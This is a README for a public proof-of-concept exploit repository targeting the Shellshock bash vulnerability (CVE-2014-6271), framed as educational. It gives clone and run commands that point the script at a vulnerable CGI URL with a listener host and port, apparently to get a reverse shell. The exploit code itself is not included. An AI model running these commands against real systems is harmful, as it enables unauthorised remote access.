# Shellshock Exploit (CVE-2014-6271)

#### Exploit
## <u>Description</u>
This repository contains an exploit for a vulnerability that affects unix-based systems. Please note that this is merely a proof-of-concept script created for educational purposes and should be used responsibly.

This exploit is designed to demonstrate how the shellshock attack works and how it could be used to gain shell access to a system through a maliciously crafted request header.

### <u>Disclaimer</u>
This repository is intended for educational purposes only. Do not use this code or any information contained within for malicious purposes. Always follow ethical guidelines and respect the law.


Usage:

	python3 shellshock.py [Vulnerable URL] [LHOST] [LPORT]
Example:

	python3 shellshock.py http://vulnerablewebsite.com/cgi-bin/test.cgi 109.876.654.321 1234


Prerequisites:
- A local development environment
- Python installed

### <u>To run this exploit, you can follow these steps:</u>
Clone this repository to your local machine.
```
git clone https://github.com/AlissonFaoli/Shellshock.git
```

Navigate to the project directory.
```
cd Shellshock
```

Run the shellshock.py script.
```
python3 shellshock.py http://vulnerable-website.com/cgi-bin/test.cgi listening_interface_IP listening_port
```

###### Please remember that this exploit should never be used against real software or systems you're not authorized to test. Unauthorized access or any malicious activity is illegal.

#### <u>License</u>
_This exploit is released under the MIT License. You can find more information about this in the LICENSE file._


# Author: Alisson Faoli

#### Github: https://github.com/AlissonFaoli
#### LinkedIn: https://linkedin.com/in/alisson-faoli



<b>If you have any questions or concerns about this exploit, please feel free to contact the author</b>
